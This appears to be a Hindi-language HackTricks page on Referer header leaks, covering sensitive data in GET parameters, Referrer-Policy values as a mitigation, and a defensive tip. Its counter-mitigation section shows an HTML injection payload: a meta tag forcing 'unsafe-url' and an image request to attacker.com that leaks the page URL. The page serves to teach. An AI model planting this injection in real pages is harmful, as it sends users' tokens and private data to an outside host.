{{#include ../banners/hacktricks-training.md}}

# Referrer headers and policy

Referrer वह हेडर है जिसका उपयोग ब्राउज़रों द्वारा यह संकेत करने के लिए किया जाता है कि कौन सा पिछला पृष्ठ देखा गया था।

## संवेदनशील जानकारी लीक

यदि किसी समय एक वेब पृष्ठ के अंदर कोई संवेदनशील जानकारी GET अनुरोध पैरामीटर पर स्थित है, यदि पृष्ठ में बाहरी स्रोतों के लिए लिंक हैं या एक हमलावर उपयोगकर्ता को एक URL पर जाने के लिए मजबूर/सुझाव देने में सक्षम है जो हमलावर द्वारा नियंत्रित है। यह नवीनतम GET अनुरोध के अंदर संवेदनशील जानकारी को निकालने में सक्षम हो सकता है।

## शमन

आप ब्राउज़र को एक **Referrer-policy** का पालन करने के लिए कह सकते हैं जो **संवेदनशील जानकारी** को अन्य वेब अनुप्रयोगों में भेजने से **बचा** सकता है:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## काउंटर-निवारण

आप इस नियम को एक HTML मेटा टैग का उपयोग करके ओवरराइड कर सकते हैं (हमलावर को एक HTML इंजेक्शन का शोषण करने की आवश्यकता है):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## रक्षा

कभी भी किसी संवेदनशील डेटा को GET पैरामीटर या URL में पथ के अंदर न रखें।

{{#include ../banners/hacktricks-training.md}}
